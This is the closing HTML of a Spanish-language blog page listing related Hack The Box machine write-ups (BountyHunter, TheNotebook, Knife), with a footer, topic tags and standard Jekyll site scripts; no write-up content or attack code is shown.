pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bountyhunter-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >20 Nov 2021<i class="unloaded">2021-11-20T20:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina BountyHunter de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil d...</p></div></div></a></div><div class="card"> <a href="/posts/thenotebook-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >31 Jul 2021<i class="unloaded">2021-07-31T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TheNotebook (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de...</p></div></div></a></div><div class="card"> <a href="/posts/knife-(hack-the-box)/"><div class="card-body"> <span class="timeago small" >28 Aug 2021<i class="unloaded">2021-08-28T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Knife de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resol...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Anterior"><p>-</p></span> <a href="/posts/thenotebook-(hack-the-box)/" class="btn btn-outline-primary" prompt="Siguiente"><p>TheNotebook (Hack The Box)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
